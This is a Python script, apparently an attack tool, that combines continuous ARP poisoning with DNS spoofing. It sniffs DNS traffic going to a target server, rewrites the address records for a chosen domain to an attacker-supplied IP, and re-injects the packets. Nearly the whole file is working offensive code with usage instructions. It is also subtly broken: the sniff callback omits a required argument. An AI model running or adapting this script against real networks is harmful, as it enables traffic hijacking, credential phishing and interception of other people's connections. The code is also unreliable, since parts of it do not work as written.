import arpSpoofing
import sys
from scapy.all import Ether , ARP,conf, get_if_addr , get_if_hwaddr,srp1,sendp,sniff , IP,DNS ,DNSRR, send
import subprocess, getopt
import time
import arpUtil
import threading
options = {
    "name": None , 
    "addr":None , 
    "dnsaddr": None ,  
    "dnsmac":None ,  
    "targetMac" : None,
    "routerMac" : None,
    "mac ":None , #my mac
    "ip" : None , #my ip 


} 

def checkpacket(packet,name): 
    try:
        for i in range(packet.ancount):
            if (packet[DNSRR][i].type == 1 or packet[DNSRR][i].type == 28) and packet[DNSRR][i].rrname == name:
                yield  i 
    except: 
        ...

def throworkill(packet,name,newaddr): 
    print("entered")
    for i in  checkpacket(packet, name)  :
        packet[DNSRR][i].rdata = newaddr 
    packet[Ether].src = options["routerMac"]
    packet[Ether].dst = options["dnsmac"]
    packet[Ether].show()
    sendp(packet,iface=options["interface"]) # if it is not the final answear we just forwarding it to he dns server


def main()->None:
    '''
    usage: dnsSpoofing.py [-h] <dns ip> <domian name> <new ip> <interface>
    !!! - use sudo!
    optional arguments:
        -h, --help          show this help message and exit
        -i IFACE, --iface IFACE
                            Interface you wish to use
        -t TARGET, --target TARGET
                            IP of target dns server
    '''
    def redoit():
        while(True):
            arpUtil.changeArpTable(options["router"], options["routerMac"], options["dnsaddr"] , options["mac"],options["interface"] )
            time.sleep(1)
    if "-h" in sys.argv[1:] or "--help" in sys.argv[1:]: 
        print(main.__doc__)
        sys.exit(0)
    options["dnsaddr"]=sys.argv[1]
    options["name"]=sys.argv[2]
    options["addr"]=sys.argv[3]
    options["interface"]=sys.argv[4]
    options["dnsmac"]=arpUtil.getTargetMac(options["dnsaddr"], options["interface"])
    options["router"] = next(filter(lambda x : x[3] == options["interface"] , dict(conf.route.__dict__)["routes"]))[2]
    options["routerMac"] = arpUtil.getTargetMac(options["router"], options["interface"])
    options["mac"]=get_if_hwaddr(options["interface"])
    options["ip"]= get_if_addr(options["interface"])
    
    #arp spoofing
    tr = threading.Thread(target=redoit)
    tr.start()

    #sniffing dns messages
    sniff(
        lfilter= lambda x : IP in x and x[IP].dst == options["dnsaddr"] , prn = lambda x : throworkill(x,options["name"]) )
    tr.join()


if __name__ == "__main__":
    main()